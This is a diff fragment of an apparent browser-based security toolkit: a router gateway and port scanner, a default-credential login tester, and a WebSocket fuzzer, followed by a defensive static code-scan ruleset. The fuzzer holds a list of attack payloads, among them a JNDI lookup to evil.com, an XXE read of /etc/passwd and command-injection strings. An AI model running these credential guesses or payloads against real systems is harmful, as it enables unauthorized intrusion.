+  if(conn){
+    L('r-out','[Connection Info]','info');
+    if(conn.effectiveType)L('r-out','📶 Type: '+conn.effectiveType,'info');
+    if(conn.downlink)L('r-out','⬇ Downlink: '+conn.downlink+' Mbps','info');
+    if(conn.rtt)L('r-out','⏱ RTT: '+conn.rtt+'ms','info');
+  }
+  L('r-out','✅ Network info complete.','ok');
+}
+
+async function doRouter(){
+  clr('r-out');
+  stopped=false;
+  const userIp=document.getElementById('r-ip').value.trim();
+  const ips=userIp?[userIp]:['192.168.1.1','192.168.0.1','192.168.2.1','10.0.0.1','10.0.0.138','192.168.100.1','192.168.1.254','192.168.8.1'];
+  L('r-out','[Router Scan] Checking '+ips.length+' gateway IP(s)...','info');
+  SEP('r-out');
+  for(const ip of ips){
+    if(stopped)break;
+    L('r-out','[Testing] http://'+ip,'info');
+    try{
+      await fetch('http://'+ip,{signal:AbortSignal.timeout(3000),mode:'no-cors'});
+      L('r-out','✅ '+ip+' — Router is REACHABLE','ok');
+      if(document.getElementById('r-hdrs').checked){
+        try{
+          const r2=await req('http://'+ip,{},5000);
+          L('r-out','  HTTP '+r2.status,'info');
+          const srv=r2.headers.get('server');
+          if(srv)L('r-out','  ⚠️ Server: '+srv+' (model/firmware exposed)','warn');
+          const www=r2.headers.get('www-authenticate');
+          if(www)L('r-out','  🔐 Auth required: '+www,'purple');
+          const html=await r2.text();
+          const title=(html.match(/<title>(.*?)<\/title>/i)||['',''])[1];
+          if(title)L('r-out','  📄 Page title: '+title,'dim');
+          // Detect router brand
+          const brands=['TP-Link','D-Link','ASUS','Netgear','Linksys','Huawei','ZTE','Xiaomi','Tenda','Ubiquiti'];
+          const found=brands.find(b=>html.toLowerCase().includes(b.toLowerCase())||title.toLowerCase().includes(b.toLowerCase()));
+          if(found)L('r-out','  🏷 Router brand detected: '+found,'purple');
+        }catch{}
+      }
+      if(document.getElementById('r-admin').checked){
+        const adminPaths=['/','index.html','login.html','admin','admin/login.html','cgi-bin/luci','webpages/index.html','ui','management'];
+        for(const path of adminPaths){
+          if(stopped)break;
+          try{
+            await fetch('http://'+ip+'/'+path,{signal:AbortSignal.timeout(2000),mode:'no-cors'});
+            L('r-out','  ✅ Admin panel: http://'+ip+'/'+path,'ok');
+          }catch{}
+        }
+      }
+      if(document.getElementById('r-ports').checked){
+        L('r-out','  [Port check]','dim');
+        const rPorts=[[80,'HTTP'],[443,'HTTPS'],[23,'Telnet (INSECURE)'],[22,'SSH'],[8080,'HTTP-Alt'],[8443,'HTTPS-Alt'],[8888,'Management']];
+        for(const[port,svc]of rPorts){
+          if(stopped)break;
+          try{
+            await fetch('http://'+ip+':'+port,{signal:AbortSignal.timeout(1500),mode:'no-cors'});
+            const danger=['Telnet (INSECURE)'].includes(svc);
+            L('r-out','  '+(danger?'🚨':'✅')+' Port '+port+' ('+svc+'): Open'+(danger?' — DANGER! Telnet sends passwords in plaintext!':''),''+(!danger?'ok':'err'));
+          }catch{L('r-out','  🔒 Port '+port+' ('+svc+'): Closed','dim');}
+        }
+      }
+    }catch{
+      L('r-out','🔒 '+ip+' — Not reachable (not your gateway)','dim');
+    }
+    SEP('r-out');
+  }
+  L('r-out','✅ Router scan complete.','ok');
+}
+
+async function doDefLogin(){
+  let url=document.getElementById('r-loginurl').value.trim();
+  if(!url){alert('Enter router URL');return;}
+  if(!url.startsWith('http'))url='http://'+url;
+  clr('r-out');
+  stopped=false;
+  const creds=[
+    ['admin','admin'],['admin','password'],['admin',''],['admin','1234'],
+    ['admin','admin123'],['root','root'],['root','admin'],['root',''],
+    ['user','user'],['admin','pass'],['administrator','administrator'],
+    ['admin','12345'],['guest','guest'],['support','support'],
+    ['tech','tech'],['admin','123456'],['admin','Admin'],['Admin','Admin'],
+    ['admin','router'],['admin','modem']
+  ];
+  L('r-out','[Default Login Test] '+url,'info');
+  L('r-out','Testing '+creds.length+' credential pairs...','dim');
+  SEP('r-out');
+  for(const[u,p]of creds){
+    if(stopped)break;
+    try{
+      const r=await fetch(url,{
+        method:'POST',
+        headers:{'Content-Type':'application/x-www-form-urlencoded'},
+        body:'username='+encodeURIComponent(u)+'&password='+encodeURIComponent(p),
+        signal:AbortSignal.timeout(5000),
+        redirect:'manual'
+      });
+      const body=await r.text();
+      const lo=body.toLowerCase();
+      const success=r.status===302||(r.status===200&&(lo.includes('dashboard')||lo.includes('logout')||lo.includes('status'))&&!lo.includes('login')&&!lo.includes('invalid')&&!lo.includes('error'));
+      L('r-out',(success?'🚨':'🔒')+' '+u+':'+p+' — '+(success?'LOGIN SUCCESS! Default credentials work!':'Failed')+' (HTTP '+r.status+')',success?'err':'dim');
+      if(success){L('r-out','   → FIX: Change default password IMMEDIATELY!','warn');break;}
+    }catch(e){L('r-out','⚠️ '+u+':'+p+' — '+e.message,'warn');}
+    await new Promise(r=>setTimeout(r,400));
+  }
+  SEP('r-out');
+  L('r-out','✅ Default login test complete.','ok');
+}
+
+// ══════════════════════════════════════════
+// WEBSOCKET
+// ══════════════════════════════════════════
+function wsConn(){
+  let url=document.getElementById('ws-url').value.trim();
+  if(!url){alert('Enter WebSocket URL');return;}
+  if(url.startsWith('http://'))url='ws://'+url.slice(7);
+  else if(url.startsWith('https://'))url='wss://'+url.slice(8);
+  else if(!url.startsWith('ws'))url='wss://'+url;
+  clr('ws-out');
+  L('ws-out','[WS] Connecting to: '+url,'info');
+  try{
+    wsSocket=new WebSocket(url);
+    wsSocket.onopen=()=>{
+      L('ws-out','✅ Connected! State: '+wsSocket.readyState,'ok');
+      document.getElementById('ws-status').textContent='● Connected ✅';
+      document.getElementById('ws-status').style.color='var(--green)';
+      document.getElementById('ws-sbtn').disabled=false;
+      document.getElementById('ws-fbtn').disabled=false;
+      document.getElementById('ws-disc').disabled=false;
+    };
+    wsSocket.onmessage=e=>{
+      let msg=e.data;
+      try{msg=JSON.stringify(JSON.parse(msg),null,2);}catch{}
+      L('ws-out','← [RECV '+new Date().toLocaleTimeString()+'] '+msg,'ok');
+    };
+    wsSocket.onerror=()=>L('ws-out','❌ WebSocket error','err');
+    wsSocket.onclose=e=>{
+      L('ws-out','🔒 Connection closed (code:'+e.code+' reason:'+e.reason+')','warn');
+      document.getElementById('ws-status').textContent='● Disconnected';
+      document.getElementById('ws-status').style.color='var(--text2)';
+      document.getElementById('ws-sbtn').disabled=true;
+      document.getElementById('ws-fbtn').disabled=true;
+      document.getElementById('ws-disc').disabled=true;
+      wsSocket=null;
+    };
+  }catch(e){L('ws-out','❌ Failed: '+e.message,'err');}
+}
+function wsDisc(){
+  if(wsSocket){wsSocket.close(1000,'User disconnected');wsSocket=null;}
+}
+function wsSend(){
+  if(!wsSocket||wsSocket.readyState!==1){L('ws-out','❌ Not connected','err');return;}
+  const msg=document.getElementById('ws-msg').value;
+  if(!msg)return;
+  const bin=document.getElementById('ws-bin').checked;
+  if(bin){wsSocket.send(new TextEncoder().encode(msg));}
+  else{wsSocket.send(msg);}
+  L('ws-out','→ [SENT '+new Date().toLocaleTimeString()+'] '+msg,'info');
+}
+async function wsFuzz(){
+  if(!wsSocket||wsSocket.readyState!==1){L('ws-out','❌ Not connected','err');return;}
+  const tmpl=document.getElementById('ws-ftmpl').value||document.getElementById('ws-msg').value;
+  const delay=parseInt(document.getElementById('ws-fdelay').value)||300;
+  const payloads=[
+    '<script>alert(1)<\/script>',"' OR '1'='1",'" OR "1"="1',
+    '../../../etc/passwd','../../../../etc/shadow','{{7*7}}','${7*7}',
+    '${jndi:ldap://evil.com/a}','null','undefined','[]','{}',
+    '-1','0','9999999999','A'.repeat(500),
+    '<img src=x onerror=alert(1)>',';ls -la','| whoami',
+    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
+  ];
+  stopped=false;
+  L('ws-out','[Fuzz] Starting with '+payloads.length+' payloads...','orange');
+  for(const p of payloads){
+    if(stopped||!wsSocket||wsSocket.readyState!==1)break;
+    const msg=tmpl.includes('§FUZZ§')?tmpl.replace(/§FUZZ§/g,p):p;
+    wsSocket.send(msg);
+    L('ws-out','→ [FUZZ] '+msg.substring(0,100),'orange');
+    await new Promise(r=>setTimeout(r,delay));
+  }
+  L('ws-out','✅ Fuzz complete.','ok');
+}
+
+// ══════════════════════════════════════════
+// CODE SCAN — static pattern-based source review
+// (ported ruleset from the security-analyst CLI scanner)
+// ══════════════════════════════════════════
+const CODE_RULES=[
+  {id:'HARD-001',title:'Hardcoded password/secret',sev:'HIGH',cwe:'CWE-798',re:/\b(password|passwd|pwd|secret|api_key|apikey|access_key|token)\s*=\s*["'][^"']{3,}["']/i,
+    desc:'A credential-like variable is assigned a literal string directly in source.',fix:'Load secrets from environment variables or a secrets manager, not literals.'},
+  {id:'CRYPTO-001',title:'Weak hash algorithm (MD5/SHA1)',sev:'MEDIUM',cwe:'CWE-327',re:/\bhashlib\.(md5|sha1)\s*\(/,
+    desc:'MD5/SHA1 are broken for collision resistance and unsuitable for password hashing.',fix:'Use SHA-256+ for integrity; bcrypt/scrypt/argon2 for passwords.'},
+  {id:'INJ-001',title:'OS command injection risk (os.system/os.popen)',sev:'CRITICAL',cwe:'CWE-78',re:/\bos\.(system|popen)\s*\(/,
+    desc:'Shelling out with unsanitized input can execute arbitrary commands.',fix:'Use subprocess with an argument list and shell=False.'},
+  {id:'INJ-002',title:'subprocess call with shell=True',sev:'HIGH',cwe:'CWE-78',re:/subprocess\.\w+\([^)]*shell\s*=\s*True/,
+    desc:'shell=True invokes a system shell; user-influenced args enable injection.',fix:'Pass command + args as a list; keep shell=False.'},
+  {id:'EVAL-001',title:'Use of eval()/exec()',sev:'CRITICAL',cwe:'CWE-95',re:/\b(eval|exec)\s*\(/,
+    desc:'Compiles and runs arbitrary text as code at runtime.',fix:'Avoid on any non-fully-trusted input; use ast.literal_eval for simple literals.'},
+  {id:'DESER-001',title:'Insecure deserialization (pickle/marshal)',sev:'CRITICAL',cwe:'CWE-502',re:/\b(pickle|marshal)\.(load|loads)\s*\(/,
+    desc:'Unpickling untrusted data can execute arbitrary code during load.',fix:'Use JSON (data-only) for anything crossing a trust boundary.'},
+  {id:'DESER-002',title:'yaml.load without SafeLoader',sev:'HIGH',cwe:'CWE-502',re:/yaml\.load\s*\((?!.*SafeLoader)/,
+    desc:'Default PyYAML loader can construct arbitrary Python objects from tags.',fix:'Use yaml.safe_load() instead.'},
+  {id:'SQLI-001',title:'Possible SQL injection (string-built query)',sev:'CRITICAL',cwe:'CWE-89',re:/(execute|executemany)\s*\(\s*(f["']|["'].*%s.*["'].*%|["'].*\{.*\}.*["']\.format|["'].*\+)/,
+    desc:'Query appears built via concatenation/formatting instead of bind parameters.',fix:'Use parameterized queries, e.g. cursor.execute("...WHERE id=?", (val,)).'},
+  {id:'XSS-001',title:'Unescaped output (mark_safe / |safe)',sev:'MEDIUM',cwe:'CWE-79',re:/mark_safe\s*\(|\|\s*safe\b/,
+    desc:'Bypasses template auto-escaping.',fix:'Sanitize explicitly (e.g. bleach) immediately before marking safe.'},
+  {id:'RAND-001',title:'Non-cryptographic RNG for security use',sev:'MEDIUM',cwe:'CWE-330',re:/\brandom\.(random|randint|choice)\s*\(/,
+    desc:'The "random" module is not cryptographically secure.',fix:'Use the "secrets" module for tokens, passwords, or keys.'},
+  {id:'DEBUG-001',title:'Debug mode enabled',sev:'MEDIUM',cwe:'CWE-489',re:/\bDEBUG\s*=\s*True\b/,
+    desc:'Debug mode can leak stack traces, source, and environment details.',fix:'Drive DEBUG from an environment variable that defaults to False.'},
+  {id:'TLS-001',title:'TLS certificate verification disabled',sev:'HIGH',cwe:'CWE-295',re:/verify\s*=\s*False/,
+    desc:'Disabling verification exposes requests to man-in-the-middle attacks.',fix:'Keep verification on; point at an internal CA bundle if needed.'},
+  {id:'BIND-001',title:'Service bound to all interfaces (0.0.0.0)',sev:'LOW',cwe:'CWE-200',re:/["']0\.0\.0\.0["']/,
+    desc:'Exposes the service on every network interface, not just localhost.',fix:'Bind to 127.0.0.1 unless external access is genuinely required.'},
+  {id:'ASSERT-001',title:'assert used for security/auth check',sev:'MEDIUM',cwe:'CWE-617',re:/\bassert\s+.*(auth|permission|admin|is_valid|logged_in)/i,
+    desc:'assert is stripped entirely when Python runs with -O, silently disabling the check.',fix:'Use an explicit if/raise instead of assert.'},
+  {id:'PATH-001',title:'Possible path traversal',sev:'MEDIUM',cwe:'CWE-22',re:/open\(\s*(os\.path\.join\([^)]*request|[^)]*\+\s*\w*input)/,
+    desc:'File path built from user input without confirming it stays in the intended directory.',fix:'Resolve the real path and verify it is still inside the base directory.'},
+  {id:'XXE-001',title:'XML parsed without disabling external entities',sev:'HIGH',cwe:'CWE-611',re:/\bxml\.etree\.ElementTree\.parse\s*\(|\blxml\.etree\.parse\s*\(/,
+    desc:'Default XML parsers may resolve external entities (XXE).',fix:'Use a hardened parser (e.g. defusedxml) for untrusted XML.'}
+];
+
+function loadCodeFile(){
+  const f=document.getElementById('cs-file').files[0];
+  if(!f)return;
+  const reader=new FileReader();
+  reader.onload=e=>{document.getElementById('cs-code').value=e.target.result;};
+  reader.readAsText(f);
+}
+
+let csCounts={c:0,h:0,m:0,l:0};
+function csUpdateStats(){
+  document.querySelectorAll('#cs-stats .stat').forEach(s=>s.classList.add('show'));
+  document.getElementById('csn-c').textContent=csCounts.c;
+  document.getElementById('csn-h').textContent=csCounts.h;
+  document.getElementById('csn-m').textContent=csCounts.m;
+  document.getElementById('csn-l').textContent=csCounts.l;
+}
+
+function runCodeScan(){
+  const code=document.getElementById('cs-code').value;
+  const out='cs-out';
+  document.getElementById(out).innerHTML='';
+  csCounts={c:0,h:0,m:0,l:0};
+  csUpdateStats();
+  if(!code.trim()){alert('Paste code or load a file first');return;}
+
+  const lines=code.split('\n');
+  let findings=[];
+  lines.forEach((line,idx)=>{
+    CODE_RULES.forEach(rule=>{
+      if(line.includes('# nosec'))return; // inline suppression, same convention as bandit
+      if(rule.re.test(line)){
+        findings.push({...rule,line:idx+1,snippet:line.trim().slice(0,140)});
+      }
+    });
+  });
+
+  const now=new Date().toLocaleString();
+  L(out,'Static Code Scan — '+now,'dim');
+  SEP(out);
+
+  if(findings.length===0){
+    L(out,'No pattern matches from the current rule set across '+lines.length+' line(s).','ok');
+    L(out,'This checks known anti-patterns only — it is not a guarantee of security. Review manually too.','dim');
+    return;
+  }
+
+  const order={CRITICAL:4,HIGH:3,MEDIUM:2,LOW:1};
+  findings.sort((a,b)=>(order[b.sev]||0)-(order[a.sev]||0));
+
+  document.getElementById(out).innerHTML='';
+  L(out,'Static Code Scan — '+now,'dim');
+  SEP(out);
+  findings.forEach(f=>{
+    const cls=(f.sev==='CRITICAL'||f.sev==='HIGH')?'err':(f.sev==='MEDIUM'?'warn':'info');
+    Lrisk(out,'L'+f.line+': '+f.title+' — '+f.id+' ',f.sev,cls);
+    L(out,'    '+f.desc,'dim');
+    L(out,'    fix: '+f.fix,'purple');
+    L(out,'    '+f.snippet,'sep');
+    if(f.sev==='CRITICAL')csCounts.c++;
+    else if(f.sev==='HIGH')csCounts.h++;
+    else if(f.sev==='MEDIUM')csCounts.m++;
+    else csCounts.l++;
+  });
+  csUpdateStats();
+  SEP(out);
+  L(out,findings.length+' finding(s) across '+lines.length+' line(s) scanned.','white');
+}
+</script>
+</body>
+</html>
